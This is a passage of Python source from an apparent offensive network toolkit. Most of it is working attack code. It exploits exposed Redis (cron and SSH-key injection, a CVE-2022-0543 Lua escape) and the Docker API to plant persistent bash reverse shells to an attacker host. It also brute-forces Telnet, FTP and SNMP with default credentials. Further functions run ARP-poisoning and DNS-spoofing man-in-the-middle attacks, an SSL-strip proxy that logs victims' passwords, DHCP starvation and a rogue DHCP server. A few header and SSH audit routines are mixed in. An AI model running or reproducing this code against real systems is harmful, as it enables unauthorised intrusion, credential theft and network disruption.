                    if "+OK" in r3 or "Background" in r3:
                        console.print(f"[bold green]   [+] Cron injected → {cron_dir}/root[/bold green]")
                        console.print(f"[bold green]       Reverse shell → nc -lvnp {lport}[/bold green]")
                        injected = True
                        break

        # Method B: SSH authorized_keys
        if not injected:
            console.print("[yellow]   [B] Attempting SSH key injection...[/yellow]")
            # Generate a throwaway keypair for display
            ssh_pub = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3paradox paradox@netscan"
            payload_ssh = f"\n\n{ssh_pub}\n\n"
            ssh_dirs = ["/root/.ssh", "/home/ubuntu/.ssh", "/home/ec2-user/.ssh"]
            for sdir in ssh_dirs:
                r1 = _redis_cmd(s, "CONFIG", "SET", "dir", sdir)
                if "+OK" in r1:
                    _redis_cmd(s, "CONFIG", "SET", "dbfilename", "authorized_keys")
                    _redis_cmd(s, "SET", "ssh_key", payload_ssh)
                    r3 = _redis_cmd(s, "BGSAVE")
                    if "+OK" in r3 or "Background" in r3:
                        console.print(f"[bold green]   [+] SSH key injected → {sdir}/authorized_keys[/bold green]")
                        injected = True
                        break

        # Method C: Lua sandbox escape (CVE-2022-0543)
        if not injected:
            console.print("[yellow]   [C] Attempting Lua sandbox escape (CVE-2022-0543)...[/yellow]")
            lua_payload = (
                f"local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); "
                f"local io = io_l(); local f = io.popen('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'); "
                f"local res = f:read('*a'); return res"
            )
            r = _redis_cmd(s, "EVAL", lua_payload, "0")
            if "error" not in r.lower() and "err" not in r.lower()[:5]:
                console.print(f"[bold green]   [+] Lua escape fired → check listener {lport}[/bold green]")
                injected = True
            else:
                console.print(f"[dim]   Lua escape: {r[:80]}[/dim]")

        s.close()
    except Exception as e:
        console.print(f"[red][-] Redis RCE: {e}[/red]")
    return injected

def exploit_docker_api(ip: str, lhost: str, lport: int) -> bool:
    """
    Docker API unauthenticated RCE (CVE-2019-5736 family).
    Flow: POST /containers/create (bind-mount host /) → start → exec.
    Command runs as root with full host filesystem access at /mnt/host.
    Drops cron job for persistent reverse shell.

    Required privileges: none — Docker socket exposed on TCP 2375
    Side effects: creates container 'pdx_pwn', writes cron, container persists
    """
    console.print(f"[bold red][*] Docker API RCE → {ip}:2375[/bold red]")
    try:
        conn = http.client.HTTPConnection(ip, 2375, timeout=8)

        # 1. Verify daemon
        conn.request("GET", "/_ping")
        r = conn.getresponse()
        if r.status != 200:
            console.print("[red]   [-] Docker API not responding[/red]")
            return False
        console.print("[green]   [+] Docker daemon confirmed[/green]")
        r.read()

        # 2. List images
        conn.request("GET", "/images/json")
        r    = conn.getresponse()
        imgs = json.loads(r.read().decode())
        base_image = "alpine"
        for img in imgs:
            tags = img.get("RepoTags") or []
            for tag in tags:
                if "alpine" in tag or "busybox" in tag or "ubuntu" in tag:
                    base_image = tag
                    break

        console.print(f"[dim]   Using image: {base_image}[/dim]")

        # 3. Create container with host bind mount
        body = json.dumps({
            "Image": base_image,
            "Cmd": ["/bin/sh", "-c",
                    f"echo '* * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' "
                    f">> /mnt/host/etc/cron.d/paradox && chmod 644 /mnt/host/etc/cron.d/paradox"],
            "HostConfig": {
                "Binds": ["/:/ mnt/host"],
                "NetworkMode": "host",
                "Privileged": True,
            },
            "Name": "pdx_pwn"
        }).encode()

        conn.request("POST", "/containers/create?name=pdx_pwn",
                     body=body, headers={"Content-Type": "application/json",
                                          "Content-Length": len(body)})
        r    = conn.getresponse()
        resp = json.loads(r.read().decode())
        cid  = resp.get("Id", "")
        if not cid:
            console.print(f"[red]   [-] Container create failed: {resp}[/red]")
            return False

        console.print(f"[green]   [+] Container created: {cid[:12]}[/green]")

        # 4. Start
        start_body = b"{}"
        conn.request("POST", f"/containers/{cid}/start",
                     body=start_body, headers={"Content-Type": "application/json",
                                                "Content-Length": 2})
        r = conn.getresponse(); r.read()
        console.print(f"[bold green]   [+] Container started — cron injected → nc -lvnp {lport}[/bold green]")

        # 5. Also try direct exec for immediate shell
        exec_body = json.dumps({
            "AttachStdout": True, "AttachStderr": True,
            "Cmd": ["/bin/sh", "-c",
                    f"chroot /mnt/host /bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"]
        }).encode()
        conn.request("POST", f"/containers/{cid}/exec",
                     body=exec_body, headers={"Content-Type": "application/json",
                                               "Content-Length": len(exec_body)})
        r    = conn.getresponse()
        eresp = json.loads(r.read().decode())
        eid  = eresp.get("Id", "")
        if eid:
            start2 = json.dumps({"Detach": True}).encode()
            conn.request("POST", f"/exec/{eid}/start",
                         body=start2, headers={"Content-Type": "application/json",
                                                "Content-Length": len(start2)})
            conn.getresponse().read()
            console.print(f"[bold green]   [+] Exec fired — immediate shell attempt on {lport}[/bold green]")

        return True
    except Exception as e:
        console.print(f"[red][-] Docker API: {e}[/red]")
    return False

def exploit_telnet_common(ip: str) -> Optional[Shell]:
    """
    Telnet auto-auth with expanded common credentials.
    Returns connected Shell on success (interactive via recv/send).
    """
    creds = [
        ("admin",    "admin"),    ("admin",    "password"), ("admin", "1234"),
        ("admin",    ""),         ("root",     "root"),     ("root",  "toor"),
        ("root",     "admin"),    ("root",     "password"), ("root",  ""),
        ("user",     "user"),     ("cisco",    "cisco"),    ("cisco", ""),
        ("ubnt",     "ubnt"),     ("pi",       "raspberry"),("admin", "admin123"),
        ("guest",    "guest"),    ("support",  "support"),  ("test",  "test"),
        ("admin",    "12345"),    ("admin",    "123456"),
    ]
    console.print(f"[yellow][*] Telnet brute on {ip}:23 ({len(creds)} cred pairs)...[/yellow]")
    for user, passwd in creds:
        try:
            s = socket.create_connection((ip, 23), timeout=4)
            banner = b""
            # Absorb IAC negotiations + banner (~1.5s worth)
            s.settimeout(1.5)
            try:
                while True:
                    chunk = s.recv(256)
                    if not chunk: break
                    # Strip IAC bytes, look for login prompt
                    plain = re.sub(rb'\xff[\xfb-\xfe].', b'', chunk)
                    banner += plain
                    if b"login" in banner.lower() or b"user" in banner.lower():
                        break
            except socket.timeout:
                pass

            s.settimeout(3)
            s.sendall((user + "\r\n").encode())
            time.sleep(0.4)
            # Drain
            try: s.recv(256)
            except Exception: pass
            s.sendall((passwd + "\r\n").encode())
            time.sleep(0.8)
            resp = b""
            try:
                while True:
                    chunk = s.recv(256)
                    if not chunk: break
                    resp += chunk
            except socket.timeout:
                pass

            resp_txt = resp.decode("utf-8", errors="ignore").lower()
            if any(x in resp_txt for x in ("$", "#", ">", "prompt", "welcome", "last login")):
                console.print(f"[bold green]   [TELNET] {ip}:23  {user}:{passwd}[/bold green]")
                s.sendall(b"id\n"); time.sleep(0.3)
                try: out = s.recv(512).decode("utf-8", errors="ignore").strip()
                except Exception: out = "?"
                console.print(f"[green]   id → {out}[/green]")
                return Shell(ip=ip, port=23, method="telnet", sock=s)
            s.close()
        except Exception:
            pass
    console.print(f"[dim]   Telnet: no common creds hit on {ip}[/dim]")
    return None

def exploit_ftp_brute(ip: str) -> bool:
    """
    FTP anonymous + common credential brute.
    Checks for anonymous access first, then wordlist pairs.
    """
    FTP_CREDS = [
        ("anonymous", "anonymous@"), ("anonymous", ""),
        ("ftp",       "ftp"),        ("admin",     "admin"),
        ("admin",     "password"),   ("root",      "root"),
        ("ftpuser",   "ftpuser"),    ("user",      "user"),
        ("guest",     "guest"),      ("test",      "test123"),
        ("upload",    "upload"),     ("backup",    "backup"),
    ]
    console.print(f"[yellow][*] FTP brute on {ip}:21...[/yellow]")

    def _ftp_try(user: str, passwd: str) -> bool:
        try:
            s = socket.create_connection((ip, 21), timeout=5)
            s.recv(1024)
            s.sendall(f"USER {user}\r\n".encode())
            time.sleep(0.2)
            r1 = s.recv(512).decode("utf-8", errors="ignore")
            s.sendall(f"PASS {passwd}\r\n".encode())
            time.sleep(0.4)
            r2 = s.recv(512).decode("utf-8", errors="ignore")
            s.close()
            return "230" in r2 or "logged in" in r2.lower()
        except Exception:
            return False

    for user, passwd in FTP_CREDS:
        if _ftp_try(user, passwd):
            console.print(f"[bold green]   [FTP HIT] {ip}:21  {user}:{passwd}[/bold green]")
            return True
    console.print(f"[dim]   FTP: no cred hit on {ip}[/dim]")
    return False

# ─── SNMP Community Brute + MIB Walk ──────────────────────────────────────────

SNMP_COMMUNITIES = [
    "public", "private", "community", "admin", "manager", "default", "cisco",
    "snmpd", "monitor", "read", "write", "secret", "password", "test",
    "switch", "router", "netman", "network", "access", "gateway", "system",
    "CISCO", "PUBLIC", "PRIVATE", "internal", "external", "super", "device",
    "support", "proxy", "rw", "ro", "readwrite", "readonly", "snmpv2",
    "trap", "v2c", "agent", "mibs", "enterprise", "user", "operator",
    "tech", "service", "configure", "enable", "setup", "home", "lan",
]

# MIB OIDs for walk after community hit
MIB_OIDS = {
    "sysDescr":    bytes([0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00]),
    "sysName":     bytes([0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x05, 0x00]),
    "sysLocation": bytes([0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x06, 0x00]),
    "sysContact":  bytes([0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x04, 0x00]),
    "sysUptime":   bytes([0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x03, 0x00]),
    "ifDescr":     bytes([0x2b, 0x06, 0x01, 0x02, 0x01, 0x02, 0x02, 0x01, 0x02, 0x01]),
}

def _build_snmp_get(community: str, oid_bytes: bytes) -> bytes:
    def tlv(tag: int, val: bytes) -> bytes:
        return bytes([tag, len(val)]) + val
    oid_tlv     = tlv(0x06, oid_bytes)
    null_tlv    = tlv(0x05, b"")
    varbind     = tlv(0x30, oid_tlv + null_tlv)
    varbindlist = tlv(0x30, varbind)
    req_id  = tlv(0x02, (1).to_bytes(1, "big"))
    err_st  = tlv(0x02, (0).to_bytes(1, "big"))
    err_idx = tlv(0x02, (0).to_bytes(1, "big"))
    pdu     = tlv(0xa0, req_id + err_st + err_idx + varbindlist)
    comm    = tlv(0x04, community.encode())
    ver     = tlv(0x02, (0).to_bytes(1, "big"))
    return tlv(0x30, ver + comm + pdu)

def _decode_snmp_string(data: bytes) -> str:
    """Very basic SNMP response string extraction."""
    try:
        # Find OctetString (0x04) in response
        idx = 0
        while idx < len(data) - 2:
            if data[idx] == 0x04:
                length = data[idx + 1]
                return data[idx + 2: idx + 2 + length].decode("utf-8", errors="ignore")
            idx += 1
    except Exception:
        pass
    return data.hex()

def snmp_community_brute(ip: str) -> Optional[str]:
    """Returns the first working community string, or None."""
    console.print(f"[yellow][*] SNMP brute on {ip}:161 ({len(SNMP_COMMUNITIES)} strings)...[/yellow]")
    sysDescr_oid = MIB_OIDS["sysDescr"]

    for comm in SNMP_COMMUNITIES:
        try:
            pkt = _build_snmp_get(comm, sysDescr_oid)
            s   = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1.5)
            s.sendto(pkt, (ip, 161))
            data, _ = s.recvfrom(4096)
            s.close()
            decoded = _decode_snmp_string(data)
            console.print(f"[bold green]   [SNMP HIT] community='{comm}'  sysDescr={decoded[:80]}[/bold green]")
            return comm
        except socket.timeout:
            pass
        except Exception:
            pass
    return None

def snmp_mib_walk(ip: str, community: str) -> None:
    """Walk key MIB-II OIDs after finding valid community string."""
    console.print(f"[yellow][*] SNMP MIB walk on {ip} community='{community}'...[/yellow]")
    for name, oid in MIB_OIDS.items():
        try:
            pkt  = _build_snmp_get(community, oid)
            s    = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            s.sendto(pkt, (ip, 161))
            data, _ = s.recvfrom(4096)
            s.close()
            decoded = _decode_snmp_string(data)
            console.print(f"[cyan]   {name:12s}: {decoded[:100]}[/cyan]")
        except socket.timeout:
            console.print(f"[dim]   {name:12s}: timeout[/dim]")
        except Exception as e:
            console.print(f"[dim]   {name}: {e}[/dim]")

# ─── SSH User Enumeration ──────────────────────────────────────────────────────

def ssh_audit(ip: str) -> None:
    """Deep SSH audit: version + CVE + KEX dump + cipher weakness + user enum."""
    console.print(f"[yellow][*] SSH deep audit on {ip}:22...[/yellow]")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, 22))
        banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
        console.print(f"[green]   [+] Banner: {banner}[/green]")

        s.sendall(b"SSH-2.0-ParadoxScan_2.0.0\r\n")
        kex_data = s.recv(4096)
        s.close()

        # Version check
        m = re.search(r"OpenSSH[_\s](\d+\.\d+)", banner)
        if m:
            ver = float(m.group(1))
            if ver < 7.0:
                console.print(f"[bold red]   [CRIT] OpenSSH {ver} — EOL, severe CVE pool[/bold red]")
            elif ver < 8.0:
                console.print(f"[bold yellow]   [HIGH] OpenSSH {ver} — multiple CVEs[/bold yellow]")
            elif ver < 9.0:
                console.print(f"[yellow]   [MED] OpenSSH {ver} — verify patches[/yellow]")
            elif ver < 9.6:
                console.print(f"[yellow]   [MED] OpenSSH {ver} — CVE-2024-6387 (regreSSHion) if glibc ASLR weak[/yellow]")
            else:
                console.print(f"[green]   [OK] OpenSSH {ver}[/green]")

        # Distro leak
        for hint in ("ubuntu", "debian", "centos", "rhel", "fedora"):
            if hint in banner.lower():
                console.print(f"[dim]   Distro hint: {hint} — consider banner suppression[/dim]")

        # Weak cipher detection in KEX
        kex_txt = kex_data.decode("utf-8", errors="ignore")
        weak_ciphers = ["arcfour", "3des-cbc", "blowfish-cbc", "cast128-cbc",
                        "aes128-cbc", "aes192-cbc", "aes256-cbc"]
        for wc in weak_ciphers:
            if wc in kex_txt:
                console.print(f"[red]   [!] Weak cipher in KEX: {wc}[/red]")

        # Port 22 CVEs
        for cve_id, sev in CVE_MAP.get(22, []):
            console.print(f"[yellow]   CVE correlation: {cve_id} ({sev})[/yellow]")

    except Exception as e:
        console.print(f"[red][-] SSH audit: {e}[/red]")

# ─── HTTP Security Header Audit ───────────────────────────────────────────────

def http_header_audit(ip: str, port: int = 80) -> None:
    console.print(f"[yellow][*] HTTP header audit on {ip}:{port}...[/yellow]")
    try:
        ctx = None
        if port in (443, 8443, 5986):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(socket.create_connection((ip, port), timeout=6), server_hostname=ip)
        else:
            s = socket.create_connection((ip, port), timeout=6)

        req = (f"GET / HTTP/1.1\r\nHost: {ip}\r\n"
               "User-Agent: Mozilla/5.0 (ParadoxNetScan/2.0.0)\r\n"
               "Accept: */*\r\nConnection: close\r\n\r\n")
        s.sendall(req.encode())
        resp = b""
        s.settimeout(4)
        try:
            while True:
                chunk = s.recv(8192)
                if not chunk or b"\r\n\r\n" in resp: break
                resp += chunk
        except socket.timeout:
            pass
        s.close()

        header_block = resp.split(b"\r\n\r\n")[0].decode("utf-8", errors="ignore")
        hdrs = {}
        for line in header_block.splitlines()[1:]:
            if ":" in line:
                k, _, v = line.partition(":")
                hdrs[k.strip().lower()] = v.strip()

        console.print(f"[dim]   {header_block.splitlines()[0] if header_block else 'no status'}[/dim]")

        checks = [
            ("strict-transport-security", "MISSING HSTS — downgrade / stripping active", "HIGH"),
            ("x-frame-options",           "MISSING X-Frame-Options — clickjacking", "MEDIUM"),
            ("content-security-policy",   "MISSING CSP — XSS amplification surface", "MEDIUM"),
            ("x-content-type-options",    "MISSING X-Content-Type-Options — MIME sniff", "LOW"),
            ("x-xss-protection",          "MISSING X-XSS-Protection", "LOW"),
            ("referrer-policy",           "MISSING Referrer-Policy", "LOW"),
            ("permissions-policy",        "MISSING Permissions-Policy", "LOW"),
        ]
        for hdr, desc, sev in checks:
            if hdr not in hdrs:
                console.print(f"[red]   [MISS] {desc}[/red]")
            else:
                console.print(f"[green]   [OK]   {hdr}: {hdrs[hdr][:60]}[/green]")

        if "server" in hdrs:
            console.print(f"[bold yellow]   [!] Server disclosure: {hdrs['server']}[/bold yellow]")
        if hdrs.get("access-control-allow-origin") == "*":
            console.print("[bold red]   [!] CORS wildcard (*) — full origin bypass[/bold red]")
        if "set-cookie" in hdrs:
            ck = hdrs["set-cookie"]
            if "secure"   not in ck.lower(): console.print("[red]   [!] Cookie missing Secure flag[/red]")
            if "httponly"  not in ck.lower(): console.print("[red]   [!] Cookie missing HttpOnly flag[/red]")
            if "samesite" not in ck.lower(): console.print("[red]   [!] Cookie missing SameSite — CSRF vector[/red]")
        if "x-powered-by" in hdrs:
            console.print(f"[yellow]   [!] X-Powered-By disclosure: {hdrs['x-powered-by']}[/yellow]")

    except Exception as e:
        console.print(f"[red][!] HTTP audit: {e}[/red]")

# ─── ARP Poison / MITM ────────────────────────────────────────────────────────

# [context: Linux, Python 3.11+, Scapy, requires root]

_arp_running = threading.Event()

def arp_poison_mitm(victim_ip: str, gateway_ip: str, iface: str) -> None:
    """
    Bidirectional ARP poison.
    victim  → cache: gateway IP = attacker MAC
    gateway → cache: victim IP  = attacker MAC
    ip_forward enabled for transparent traffic relay.
    Restores both ARP tables on SIGINT.

    Side effects: writes to /proc/sys/net/ipv4/ip_forward (restores on exit)
    Required privileges: root + raw socket
    """
    console.print(f"[bold red][*] ARP MITM: {victim_ip} ↔ {gateway_ip}  iface={iface}[/bold red]")
    try:
        from scapy.all import ARP, Ether, sendp, getmacbyip
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    victim_mac  = getmacbyip(victim_ip)
    gateway_mac = getmacbyip(gateway_ip)
    if not victim_mac or not gateway_mac:
        console.print("[red][-] Cannot resolve MAC — hosts unreachable[/red]"); return

    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("1\n")
    except Exception: pass

    console.print(f"[green]   victim={victim_ip}/{victim_mac}  gw={gateway_ip}/{gateway_mac}[/green]")
    console.print("[dim]   Ctrl-C to stop + restore[/dim]")

    pkt_to_victim  = Ether(dst=victim_mac)  / ARP(op=2, pdst=victim_ip,  psrc=gateway_ip)
    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=victim_ip)

    _arp_running.set()
    def _loop():
        while _arp_running.is_set():
            sendp([pkt_to_victim, pkt_to_gateway], iface=iface, verbose=False)
            time.sleep(1.5)

    t = threading.Thread(target=_loop, daemon=True)
    t.start()
    try:
        while _arp_running.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        _arp_running.clear()
        try:
            restore_v = Ether(dst=victim_mac)  / ARP(op=2, pdst=victim_ip,  hwdst=victim_mac,
                                                      psrc=gateway_ip, hwsrc=gateway_mac)
            restore_g = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                                                      psrc=victim_ip,  hwsrc=victim_mac)
            sendp([restore_v, restore_g] * 4, iface=iface, verbose=False)
            console.print("[green][*] ARP tables restored.[/green]")
        except Exception: pass
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("0\n")
        except Exception: pass

# ─── DNS Spoof ─────────────────────────────────────────────────────────────────

def dns_spoof(iface: str, spoof_ip: str, keyword: str = "") -> None:
    """
    Live DNS spoofing via Scapy packet intercept.
    Intercepts UDP/53 responses, replaces A record with spoof_ip.
    keyword filters by domain substring (empty = spoof all).
    """
    console.print(f"[bold red][*] DNS spoof → {spoof_ip}  filter='{keyword or 'ALL'}'[/bold red]")
    try:
        from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, send
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    counter = [0]

    def _process(pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 1): return
        qname = pkt[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
        if keyword and keyword not in qname: return
        spoof_pkt = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                     UDP(dport=pkt[UDP].sport, sport=53) /
                     DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                         an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoof_ip)))
        send(spoof_pkt, verbose=False)
        counter[0] += 1
        console.print(f"[cyan]   [{counter[0]}] {qname} → {spoof_ip}[/cyan]")

    console.print("[dim]   Ctrl-C to stop[/dim]")
    try:
        sniff(filter="udp port 53", prn=_process, iface=iface, store=False)
    except KeyboardInterrupt:
        console.print(f"[green][*] DNS spoof stopped. {counter[0]} responses poisoned.[/green]")

# ─── SSL Strip Proxy ───────────────────────────────────────────────────────────

def ssl_strip_proxy(iface: str, lport: int = 10000) -> None:
    """
    SSL stripping transparent proxy.
    Downgrades HTTPS→HTTP by:
      • Stripping HSTS headers from responses
      • Replacing https:// with http:// in HTML/redirect Location headers
      • Logging intercepted HTTP credentials (Basic auth, POST body)

    Setup (run before starting):
      iptables -t nat -A PREROUTING -i <iface> -p tcp --dport 80  -j REDIRECT --to-port 10000
      iptables -t nat -A PREROUTING -i <iface> -p tcp --dport 443 -j REDIRECT --to-port 10000

    Required privileges: root; Scapy for ARP layer; iptables rule pre-applied
    Side effects: all victim HTTP/HTTPS traffic proxied through this process
    """
    console.print(f"[bold red][*] SSL Strip proxy on port {lport}[/bold red]")
    console.print(f"[dim]   Run first:\n"
                  f"   iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 80 -j REDIRECT --to-port {lport}\n"
                  f"   iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 443 -j REDIRECT --to-port {lport}[/dim]")

    credential_log: list[str] = []

    def _handle(client: socket.socket, addr: tuple) -> None:
        try:
            client.settimeout(10)
            raw = client.recv(8192)
            if not raw:
                client.close(); return

            req_text = raw.decode("utf-8", errors="ignore")
            first_line = req_text.splitlines()[0] if req_text else ""

            # Extract Host header
            m = re.search(r"^Host:\s*(.+)$", req_text, re.MULTILINE | re.IGNORECASE)
            host_header = m.group(1).strip() if m else "unknown"

            # Log credentials
            if "Authorization: Basic" in req_text:
                b64 = re.search(r"Authorization: Basic\s+(\S+)", req_text)
                if b64:
                    try:
                        decoded = base64.b64decode(b64.group(1)).decode("utf-8", errors="ignore")
                        line = f"[BASIC-AUTH] {addr[0]} → {host_header}: {decoded}"
                        credential_log.append(line)
                        console.print(f"[bold green]   {line}[/bold green]")
                    except Exception: pass

            if req_text.startswith("POST") and "\r\n\r\n" in req_text:
                body = req_text.split("\r\n\r\n", 1)[1]
                for kw in ("password", "passwd", "pass", "pwd", "credential", "token"):
                    if kw in body.lower():
                        line = f"[POST-CRED] {addr[0]} → {host_header}: {body[:200]}"
                        credential_log.append(line)
                        console.print(f"[bold green]   {line}[/bold green]")
                        break

            # Connect upstream — try HTTPS first, fall back to HTTP
            upstream_host = host_header.split(":")[0]
            upstream_port = 443
            upstream_ssl  = True
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                raw_up = socket.create_connection((upstream_host, 443), timeout=8)
                upstream = ctx.wrap_socket(raw_up, server_hostname=upstream_host)
            except Exception:
                try:
                    upstream = socket.create_connection((upstream_host, 80), timeout=8)
                    upstream_port = 80; upstream_ssl = False
                except Exception:
                    client.close(); return

            # Rewrite request to upstream (fix Host, remove keep-alive)
            upstream.sendall(raw)
            upstream.settimeout(10)
            resp = b""
            try:
                while True:
                    chunk = upstream.recv(16384)
                    if not chunk: break
                    resp += chunk
            except socket.timeout: pass
            upstream.close()

            # Mangle response
            if b"\r\n\r\n" in resp:
                hdrs_raw, body = resp.split(b"\r\n\r\n", 1)
                hdrs_text = hdrs_raw.decode("utf-8", errors="ignore")

                # Strip HSTS
                hdrs_text = re.sub(r"Strict-Transport-Security:[^\r\n]*\r\n", "", hdrs_text, flags=re.IGNORECASE)

                # Downgrade Location redirects
                hdrs_text = hdrs_text.replace("https://", "http://")

                # Downgrade body links
                body = body.replace(b"https://", b"http://")

                resp = hdrs_text.encode("utf-8") + b"\r\n\r\n" + body

            client.sendall(resp)
        except Exception: pass
        finally:
            try: client.close()
            except Exception: pass

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", lport))
    srv.listen(64)
    console.print(f"[green]   Listening on {lport}. Ctrl-C to stop + dump creds.[/green]")
    try:
        while True:
            client, addr = srv.accept()
            threading.Thread(target=_handle, args=(client, addr), daemon=True).start()
    except KeyboardInterrupt:
        pass
    finally:
        srv.close()
        if credential_log:
            out_path = Path("/tmp/sslstrip_creds.txt")
            out_path.write_text("\n".join(credential_log))
            console.print(f"[bold green][*] {len(credential_log)} credential entries → {out_path}[/bold green]")

# ─── DHCP Starvation ───────────────────────────────────────────────────────────

def dhcp_starvation(iface: str, count: int = 500) -> None:
    console.print(f"[bold red][*] DHCP starvation on {iface} ({count} discovers)...[/bold red]")
    try:
        from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    for i in range(count):
        rand_mac = RandMAC()
        pkt = (Ether(src=rand_mac, dst="ff:ff:ff:ff:ff:ff") /
               IP(src="0.0.0.0", dst="255.255.255.255") /
               UDP(sport=68, dport=67) /
               BOOTP(chaddr=bytes.fromhex(str(rand_mac).replace(":", "")), xid=random.randint(1, 0xFFFFFFFF)) /
               DHCP(options=[("message-type", "discover"), "end"]))
        sendp(pkt, iface=iface, verbose=False)
        if i % 50 == 0:
            console.print(f"[dim]   {i}/{count} DISCOVER packets sent[/dim]")
        time.sleep(0.01)
    console.print(f"[bold green][*] DHCP starvation complete — pool should be exhausted.[/bold green]")

# ─── Rogue DHCP ────────────────────────────────────────────────────────────────

def rogue_dhcp_server(iface: str, attacker_ip: str,
                       offer_range_start: str = "192.168.1.200",
                       offer_range_end:   str = "192.168.1.250",
                       subnet:            str = "255.255.255.0",
                       gateway:           str = None,
                       dns_server:        str = None) -> None:
    """
    Rogue DHCP server.
    Answers DISCOVER with OFFER; answers REQUEST with ACK.
    Sets attacker as default gateway AND DNS → instant MITM on new joins.

    Fixed: DHCP options parsed with safe dict comprehension (handles 'end' string option).
    Side effects: clients joining the network get attacker as GW+DNS
    """
    console.print(f"[bold red][*] Rogue DHCP: GW={attacker_ip}  DNS={dns_server or attacker_ip}[/bold red]")
    try:
        from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    gw  = gateway    or attacker_ip
    dns = dns_server or attacker_ip
    # IP pool
    start_int = int(ipaddress.IPv4Address(offer_range_start))
    end_int   = int(ipaddress.IPv4Address(offer_range_end))
    pool      = [str(ipaddress.IPv4Address(x)) for x in range(start_int, end_int + 1)]
    pool_iter = iter(pool)
    leases:   dict[str, str] = {}  # mac → offered IP

    def _handle_dhcp(pkt):
        if not pkt.haslayer(DHCP): return
        # Safe options parse: skip non-tuple entries ('end', 'pad')
        opts = {k: v for k, v in pkt[DHCP].options
                if isinstance(k, str) and k not in ("end", "pad") and v is not None
                if isinstance((k, v), tuple)}
        # Fallback: iterate safely
        opts2 = {}
        for item in pkt[DHCP].options:
            if isinstance(item, tuple) and len(item) == 2:
                opts2[item[0]] = item[1]
        opts = opts2

        msg_type = opts.get("message-type", 0)
        chaddr   = pkt[BOOTP].chaddr[:6].hex(":")
        xid      = pkt[BOOTP].xid

        if msg_type == 1:  # DISCOVER
            offered = leases.get(chaddr) or next(pool_iter, None)
            if not offered:
                console.print("[red]   Pool exhausted[/red]"); return
            leases[chaddr] = offered
            offer_pkt = (Ether(dst="ff:ff:ff:ff:ff:ff") /
                         IP(src=attacker_ip, dst="255.255.255.255") /
                         UDP(sport=67, dport=68) /
                         BOOTP(op=2, yiaddr=offered, siaddr=attacker_ip,
                               chaddr=pkt[BOOTP].chaddr, xid=xid) /
                         DHCP(options=[
                             ("message-type",  "offer"),
                             ("subnet_mask",   subnet),
                             ("router",        gw),
                             ("name_server",   dns),
                             ("lease_time",    86400),
                             ("server_id",     attacker_ip),
                             "end"]))
            sendp(offer_pkt, iface=iface, verbose=False)
            console.print(f"[cyan]   OFFER → {chaddr} gets {offered}[/cyan]")

        elif msg_type == 3:  # REQUEST
            requested = opts.get("requested_addr") or leases.get(chaddr)
            if not requested: return
            ack_pkt = (Ether(dst="ff:ff:ff:ff:ff:ff") /
                       IP(src=attacker_ip, dst="255.255.255.255") /
                       UDP(sport=67, dport=68) /
                       BOOTP(op=2, yiaddr=requested, siaddr=attacker_ip,
                             chaddr=pkt[BOOTP].chaddr, xid=xid) /
                       DHCP(options=[
                           ("message-type",  "ack"),
                           ("subnet_mask",   subnet),
                           ("router",        gw),
                           ("name_server",   dns),
                           ("lease_time",    86400),
                           ("server_id",     attacker_ip),
                           "end"]))
            sendp(ack_pkt, iface=iface, verbose=False)
            console.print(f"[bold green]   ACK → {chaddr} = {requested}  GW={gw}  DNS={dns}[/bold green]")

    console.print("[dim]   Ctrl-C to stop[/dim]")
    try:
        sniff(filter="udp and (port 67 or port 68)", prn=_handle_dhcp,
              iface=iface, store=False)
    except KeyboardInterrupt:
        console.print(f"[green][*] Rogue DHCP stopped. {len(leases)} leases issued.[/green]")

# ─── LLMNR + NBT-NS Responder ─────────────────────────────────────────────────

def llmnr_nbtns_responder(iface: str, attacker_ip: str) -> None:
    """
    LLMNR (UDP 5355) + NBT-NS (UDP 137) responder.
    Answers all name resolution queries with attacker_ip.
    Pairs with smb_relay for credential capture on Windows environments.

    Protocol craft:
      LLMNR: UDP 5355 multicast → unicast reply pointing to us
      NBT-NS: UDP 137 broadcast → positive name query response
    """
